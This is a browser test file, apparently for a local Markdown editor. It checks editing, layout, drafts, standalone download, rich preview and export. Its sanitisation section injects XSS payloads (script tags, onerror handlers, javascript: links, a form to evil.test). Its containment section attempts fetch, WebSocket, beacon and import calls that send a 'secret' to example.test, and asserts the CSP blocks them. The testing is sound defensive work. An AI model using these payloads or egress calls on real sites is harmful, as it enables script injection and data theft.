/* ---------------------------------------------------------------------------
 * End-to-end tests in a real browser.
 *
 * They run against the built file, served the way production serves it. The
 * point is not that buttons respond, but that the project's promise holds: the
 * browser must refuse every network egress, the preview must neutralise hostile
 * HTML, and the standalone file must start on its own without carrying the
 * user's document with it.
 *
 * puppeteer is deliberately not a project dependency: it downloads a full
 * Chrome, which would weigh down `npm install` and the image build for
 * everyone.
 *
 *   npm run dev &                      # or: docker run -p 8080:8080 md-editor
 *   npm install --no-save puppeteer
 *   node test/browser.mjs
 *
 * Environment variables:
 *   TARGET                        URL under test (default http://localhost:8080/)
 *   PUPPETEER_EXECUTABLE_PATH     browser to use
 * ------------------------------------------------------------------------- */

import puppeteer from "puppeteer";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const TARGET = process.env.TARGET || "http://localhost:8080/";
const DL = mkdtempSync(join(tmpdir(), "md-editor-test-"));
mkdirSync(DL, { recursive: true });

let fails = 0;
const ok = (name, cond, detail = "") => {
  console.log(`  ${cond ? "ok  " : "FAIL"}  ${name}${detail ? " -- " + detail : ""}`);
  if (!cond) fails++;
};
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

const browser = await puppeteer.launch({
  headless: "shell",
  executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
  args: ["--no-sandbox", "--disable-dev-shm-usage"],
});

// Browser advisories that say nothing about the application. Served over plain
// HTTP on an IP address, Chrome reports that it ignored Cross-Origin-Opener-
// Policy because the origin is not trustworthy -- which is the documented
// consequence of an insecure origin, not a fault in the page.
const BENIGN_CONSOLE = [
  /Cross-Origin-Opener-Policy header has been ignored/i,
];

async function newPage() {
  const page = await browser.newPage();
  await page.setViewport({ width: 1280, height: 800 });
  const errors = [], csp = [];
  page.on("pageerror", (e) => errors.push(String(e)));
  page.on("console", (m) => {
    const t = m.text();
    if (m.type() === "error" && !BENIGN_CONSOLE.some((re) => re.test(t))) errors.push(t);
    if (/Content Security Policy/i.test(t)) csp.push(t);
  });
  return { page, errors, csp };
}

const { page, errors, csp } = await newPage();
const cdp = await page.createCDPSession();

/** Pick a button by its exact label. */
const btn = async (label) => {
  for (const e of await page.$$("button")) {
    if ((await e.evaluate((n) => n.textContent)) === label) return e;
  }
  throw new Error(`button not found: ${label}`);
};

async function clearSource() {
  await page.click(".cm-content");
  await page.keyboard.down("Control");
  await page.keyboard.press("KeyA");
  await page.keyboard.up("Control");
  await page.keyboard.press("Backspace");
}

/** Replace the source pane content by simulating real typing. */
async function retype(content) {
  await clearSource();
  await page.type(".cm-content", content);
  await wait(400);
}

/**
 * Drop content in as a single block, like a paste.
 *
 * Use this whenever the source contains HTML: lang-markdown delegates HTML
 * blocks to @codemirror/lang-html, whose `autoCloseTags` adds the closing tag
 * when "&gt;" is typed. Typed character by character, an already complete
 * fragment would come out with one closing tag too many.
 */
async function pasteSource(content) {
  await clearSource();
  await cdp.send("Input.insertText", { text: content });
  await wait(500);
}

/* ========================= 1. loading ========================= */
console.log("\n--- loading and start-up ---");
await page.goto(TARGET, { waitUntil: "networkidle0" });
await wait(600);

ok("no JavaScript error at start-up", errors.length === 0, errors.slice(0, 3).join(" | "));
ok("no CSP violation at start-up", csp.length === 0, csp.slice(0, 3).join(" | "));
ok("the toolbar is rendered", (await page.$(".tb")) !== null);
ok("CodeMirror is mounted", (await page.$(".cm-editor .cm-content")) !== null);
ok("the preview renders the sample document",
  (await page.$eval("#preview h1", (e) => e.textContent).catch(() => null)) === "Local Markdown editor");
ok("GFM tables are rendered", (await page.$$eval("#preview table th", (e) => e.length)) === 2);

/* ========================= 2. editing ========================= */
console.log("\n--- editing and rendering ---");
// markdown() installs markdownKeymap, which continues lists automatically:
// after "- alpha" plus Enter the next dash is already there. So type the way a
// human would, without repeating the marker.
await retype("# Hello\n\nA **test** with `some code`.\n\n- alpha\nbeta");

const lines = await page.$$eval(".cm-line", (ls) => ls.map((l) => l.textContent));
ok("automatic list continuation works",
  lines.at(-1) === "- beta", JSON.stringify(lines.slice(-2)));
ok("the typed heading appears in the preview",
  (await page.$eval("#preview h1", (e) => e.textContent)) === "Hello");
ok("bold is rendered", (await page.$$eval("#preview strong", (e) => e.length)) === 1);
ok("inline code is rendered", (await page.$$eval("#preview code", (e) => e.length)) === 1);
ok("the list is rendered", (await page.$$eval("#preview li", (e) => e.length)) === 2);

const sb = await page.$eval(".sb", (e) => e.textContent);
ok("the status bar counts words", /\d+ words/.test(sb), sb.trim());
ok("the modified indicator is on", /modified/.test(sb));

/* ========================= 3. sanitisation ========================= */
console.log("\n--- HTML sanitisation ---");
await page.evaluate(() => { window.__xss = 0; });
await retype([
  "<script>window.__xss=1<\/script>",
  '<img src=x onerror="window.__xss=1">',
  '<a href="javascript:window.__xss=1">link</a>',
  '<iframe src="https://example.com"></iframe>',
  "<style>body{display:none}</style>",
  '<form action="https://evil.test"><input name="a"></form>',
  "[ordinary link](https://example.com)",
].join("\n\n"));

const rendered = await page.$eval("#preview", (e) => e.innerHTML);
ok("no script executed", (await page.evaluate(() => window.__xss)) === 0);
ok("no <script> tag kept", !/<script/i.test(rendered));
ok("no onerror handler kept", !/onerror/i.test(rendered));
ok("no javascript: URL kept", !/javascript:/i.test(rendered));
ok("no <iframe> kept", !/<iframe/i.test(rendered));
ok("no <style> kept", !/<style/i.test(rendered));
ok("no <form> kept", !/<form/i.test(rendered));
ok("legitimate links get rel=noopener noreferrer",
  await page.$eval('#preview a[href^="https://example.com"]',
    (a) => a.rel === "noopener noreferrer" && a.target === "_blank").catch(() => false));
ok("the interface survives the injection", (await page.$(".tb")) !== null);

/* ========================= 4. network containment ========================= */
console.log("\n--- network containment ---");
// Return values prove nothing here: the WebSocket constructor throws no
// synchronous exception, and sendBeacon() returns `true` as soon as the request
// is queued, before the CSP steps in. The only authoritative witness is the
// `securitypolicyviolation` event.
const violations = await page.evaluate(async () => {
  const seen = [];
  document.addEventListener("securitypolicyviolation", (e) =>
    seen.push(e.effectiveDirective + " -> " + e.blockedURI));

  try { await fetch("https://example.test/leak"); } catch {}
  try { new WebSocket("wss://example.test/leak"); } catch {}
  try { navigator.sendBeacon("https://example.test/leak", "secret"); } catch {}
  try { new Image().src = "https://example.test/pixel.png"; } catch {}
  try { await import("https://example.test/mod.js"); } catch {}

  await new Promise((r) => setTimeout(r, 1200));
  return seen;
});
const blocked = (f) => violations.some((v) => v.includes(f));
ok("fetch() is blocked by connect-src",
  blocked("connect-src -> https://example.test/leak"), violations.join(" | "));
ok("WebSocket is blocked by connect-src", blocked("connect-src -> wss://example.test/leak"));
ok("sendBeacon is blocked by connect-src",
  violations.filter((v) => v.includes("connect-src -> https://example.test/leak")).length >= 2);
ok("remote images are blocked by img-src",
  blocked("img-src -> https://example.test/pixel.png"));
ok("remote dynamic imports are blocked", blocked("https://example.test/mod.js"));

/* ========================= 5. interface ========================= */
console.log("\n--- interface ---");
const display = (sel) => page.$eval(sel, (e) => getComputedStyle(e).display);

await (await btn("Source")).click();
ok("Source layout: the preview is hidden", (await display(".pane-preview")) === "none");
await (await btn("Preview")).click();
ok("Preview layout: the source is hidden", (await display(".pane-editor")) === "none");
await (await btn("Split")).click();
ok("Split layout: both panes are visible",
  (await display(".pane-preview")) !== "none" && (await display(".pane-editor")) !== "none");

const t0 = await page.evaluate(() => document.documentElement.dataset.theme);
await (await btn("Theme")).click();
const t1 = await page.evaluate(() => document.documentElement.dataset.theme);
ok("the theme toggles", t0 !== t1, `${t0} -> ${t1}`);
await (await btn("Theme")).click();

await (await btn("?")).click();
ok("the About dialog opens", (await page.$(".sheet")) !== null);
await (await btn("Close")).click();
ok("the About dialog closes", (await page.$(".sheet")) === null);

/* ========================= 6. local draft ========================= */
console.log("\n--- local draft ---");
const draft = () => page.evaluate(() => localStorage.getItem("mdedit.draft"));
ok("nothing is stored by default", (await draft()) === null);
await page.click(".chk input");
await wait(300);
ok("the draft is written once the box is ticked", (await draft()) !== null);
await page.click(".chk input");
await wait(300);
ok("the draft is erased when unticked", (await draft()) === null);

/* ========================= 7. standalone application ========================= */
console.log("\n--- downloadable standalone file ---");
await cdp.send("Browser.setDownloadBehavior", { behavior: "allow", downloadPath: DL });

const CANARY = "MY ABSOLUTE SECRET 4242";
await retype(CANARY);
await (await btn("Download app")).click();

const standalonePath = join(DL, "md-editor.html");
for (let i = 0; i < 40 && !existsSync(standalonePath); i++) await wait(200);
ok("md-editor.html is downloaded", existsSync(standalonePath), readdirSync(DL).join(","));

if (existsSync(standalonePath)) {
  const file = readFileSync(standalonePath, "utf8");
  ok("the standalone file does not contain the user's document", !file.includes(CANARY));

  const fileJs = file.match(/<script id="app-js">([\s\S]*?)<\/script>/)[1];
  const declared = file.match(/script-src 'sha256-([^']+)'/)[1];
  ok("the standalone file's digest matches its script",
    createHash("sha256").update(fileJs, "utf8").digest("base64") === declared);

  // The decisive test: the downloaded file must start on its own, from file://.
  const { page: p2, errors: e2, csp: c2 } = await newPage();
  await p2.goto("file://" + standalonePath, { waitUntil: "networkidle0" });
  await wait(800);
  ok("the standalone file starts from file:// without error", e2.length === 0, e2.slice(0, 2).join(" | "));
  ok("the standalone file raises no CSP violation", c2.length === 0, c2.slice(0, 2).join(" | "));
  ok("the standalone file mounts CodeMirror", (await p2.$(".cm-editor .cm-content")) !== null);
  ok("the standalone file renders the preview",
    (await p2.$eval("#preview h1", (e) => e.textContent).catch(() => null)) === "Local Markdown editor");
  await p2.close();
}

/* ========================= 8. Save as ========================= */
console.log("\n--- Save as ---");

// The File System Access API only exists in a secure context. Over plain HTTP
// on an IP address it is absent, and both buttons fall back to a download --
// which is exactly when "Save as" must still ask for a name, or it becomes
// indistinguishable from "Save".
const hasFSA = await page.evaluate(() => typeof window.showSaveFilePicker === "function");

if (hasFSA) {
  ok("the file picker is available on this origin, Save as uses it", true,
    "run against an http:// IP origin to exercise the fallback");
} else {
  let asked = null;
  page.once("dialog", async (d) => { asked = d.message(); await d.dismiss(); });
  await (await btn("Save as")).click();
  await wait(500);
  ok("without a file picker, Save as asks for a file name",
    asked !== null && /name/i.test(asked), String(asked));
}

/* ========================= 9. editing the preview ========================= */
console.log("\n--- editing the preview ---");

/** Source pane text, reassembled from the displayed lines. */
const sourceText = () =>
  page.$$eval(".cm-line", (ls) => ls.map((l) => l.textContent).join("\n"));

/**
 * Empty the rich editor and type into it.
 *
 * Clearing goes through the source pane rather than a select-all inside the
 * rich editor: the source is authoritative, so emptying it propagates down
 * deterministically. Selecting inside the rich editor right after clicking into
 * it races with the pending source-to-preview sync, and the test would flake.
 */
async function retypeRich(content) {
  await clearSource();
  await wait(400);
  await page.click("#rich .ProseMirror");
  if (content) await page.keyboard.type(content);
  await wait(500);
}

// --- layout and editing mode are independent ---
// The toggle must never alter the chosen layout: when the preview is hidden it
// is disabled, not hijacked.
await (await btn("Source")).click();
await wait(300);
ok("in Source layout the edit toggle is disabled",
  (await (await btn("Edit preview")).evaluate((b) => b.disabled)) === true);
ok("the ribbon stays hidden in Source layout",
  (await page.$eval(".rb", (e) => getComputedStyle(e).display)) === "none");

await (await btn("Split")).click();
await wait(300);
ok("the toggle becomes usable as soon as the preview is shown",
  (await (await btn("Edit preview")).evaluate((b) => b.disabled)) === false);

await retype("# Start\n\nInitial text.");
const viewBefore = await page.$eval(".panes", (e) => e.dataset.view);
await (await btn("Edit preview")).click();
await wait(400);

ok("turning editing on does not change the layout",
  (await page.$eval(".panes", (e) => e.dataset.view)) === viewBefore, viewBefore);

// The active state must read at a glance, so it wears the same colour as the
// selected layout option.
ok("the active toggle is visually distinct", await page.evaluate(() => {
  const toggle = [...document.querySelectorAll(".tb button")]
    .find((b) => b.textContent === "Edit preview");
  const selected = document.querySelector('.seg button[aria-pressed="true"]');
  const c = getComputedStyle(toggle);
  return c.backgroundColor === getComputedStyle(selected).backgroundColor &&
    c.backgroundColor !== getComputedStyle(document.body).backgroundColor;
}));

ok("the formatting ribbon appears",
  (await page.$eval(".rb", (e) => getComputedStyle(e).display)) !== "none");
ok("the rich editor is mounted", (await page.$("#rich .ProseMirror")) !== null);
ok("the read-only preview is hidden",
  (await page.$eval("#preview", (e) => getComputedStyle(e).display)) === "none");
ok("the preview picks up the current document",
  (await page.$eval("#rich h1", (e) => e.textContent).catch(() => null)) === "Start");

// --- typing in the preview reaches the source ---
await retypeRich("Written in the preview");
ok("typing in the preview updates the source",
  (await sourceText()).includes("Written in the preview"), await sourceText());

// --- the ribbon really produces Markdown ---
await page.keyboard.down("Control");
await page.keyboard.press("KeyA");
await page.keyboard.up("Control");
await (await btn("B")).click();
await wait(400);
ok("the Bold button produces **bold** in the source",
  /\*\*Written in the preview\*\*/.test(await sourceText()), await sourceText());

await page.keyboard.down("Control");
await page.keyboard.press("KeyA");
await page.keyboard.up("Control");
await (await btn("B")).click();
await wait(300);

await page.select(".rb-select", "h2");
await wait(400);
ok("the style selector produces a level 2 heading",
  /^##\s/.test((await sourceText()).trim()), await sourceText());

await page.select(".rb-select", "p");
await wait(300);

// --- lists and tasks ---
await retypeRich("alpha");
await (await btn("Tasks")).click();
await wait(400);
ok("the Tasks button produces a checkbox",
  /^-\s\[ \]\salpha/.test((await sourceText()).trim()), await sourceText());

await page.click("#rich .task-check");
await wait(400);
ok("clicking the box ticks the task in the source",
  /^-\s\[x\]\salpha/.test((await sourceText()).trim()), await sourceText());

ok("the ticked box is reflected in the preview",
  (await page.$eval("#rich li.task-item", (e) => e.getAttribute("data-checked"))) === "true");

// --- tables ---
await retypeRich("");
await (await btn("Table")).click();
await wait(500);
const tableSource = await sourceText();
ok("the Table button produces a GFM table",
  /\|\s*\|/.test(tableSource) && /\|\s*---\s*\|/.test(tableSource), tableSource.slice(0, 80));
ok("table tools appear when the cursor is inside one",
  (await page.$eval(".rb-group", (e) => getComputedStyle(e).display)) !== "none");
ok("the table is rendered in the rich editor",
  (await page.$$eval("#rich table th", (e) => e.length)) === 3);

await (await btn("+Col")).click();
await wait(400);
ok("adding a column shows up in the preview",
  (await page.$$eval("#rich table th", (e) => e.length)) === 4);

// --- the source stays authoritative: what is typed left flows right ---
await retype("## From the source\n\nWith some *style*.");
await wait(500);
ok("typing in the source updates the preview",
  (await page.$eval("#rich h2", (e) => e.textContent).catch(() => null)) === "From the source");
ok("emphasis typed in the source is rendered",
  (await page.$$eval("#rich em", (e) => e.length)) === 1);

// --- raw HTML survives the round trip ---
const HTML_FIXTURE = "Before\n\n<details><summary>More</summary>\nhidden\n</details>\n\nAfter";
await pasteSource(HTML_FIXTURE);
ok("the source receives the HTML fragment unaltered",
  (await sourceText()) === HTML_FIXTURE, await sourceText());
await wait(400);

ok("raw HTML is marked as non-editable in the preview",
  (await page.$("#rich .raw-html")) !== null);

// Edit the neighbouring paragraph, not the HTML block. Clicking the latter
// would select it as an atomic node -- typing would then replace it, which is
// normal editor behaviour but not what is under test here.
await page.click("#rich p");
await page.keyboard.press("End");
await page.keyboard.type(" !");
await wait(500);
const afterEdit = await sourceText();
ok("raw HTML survives an edit elsewhere in the document",
  afterEdit.includes("<details><summary>More</summary>"), afterEdit);
ok("the neighbouring edit did happen", afterEdit.includes("Before !"), afterEdit);

// --- leaving rich mode loses nothing ---
await retypeRich("Final preview content");
const viewBeforeExit = await page.$eval(".panes", (e) => e.dataset.view);
await (await btn("Edit preview")).click();
await wait(400);
ok("leaving rich mode pushes the last changes down",
  (await sourceText()).includes("Final preview content"), await sourceText());
ok("turning editing off does not change the layout either",
  (await page.$eval(".panes", (e) => e.dataset.view)) === viewBeforeExit, viewBeforeExit);
ok("the read-only preview comes back",
  (await page.$eval("#preview", (e) => getComputedStyle(e).display)) !== "none");
ok("the ribbon disappears",
  (await page.$eval(".rb", (e) => getComputedStyle(e).display)) === "none");

/* ========================= 10. exporting the rendered document ========================= */
console.log("\n--- exporting the rendered document ---");
await retype("# Report\n\n**Exported** content.");
await (await btn("Export HTML")).click();

const exportPath = join(DL, "untitled.html");
for (let i = 0; i < 40 && !existsSync(exportPath); i++) await wait(200);
const exported = existsSync(exportPath) ? readFileSync(exportPath, "utf8") : "";
ok("the rendered document is exported as HTML", exported.length > 0, readdirSync(DL).join(","));
ok("the export contains the rendered document", /<h1[^>]*>Report<\/h1>/.test(exported));
ok("the export carries its own locked-down CSP", /default-src 'none'/.test(exported));
ok("the export contains no script", !/<script/i.test(exported));

await browser.close();
console.log();
if (fails) {
  console.error(`  ${fails} test(s) failed\n`);
  process.exit(1);
}
console.log("  all tests pass\n");
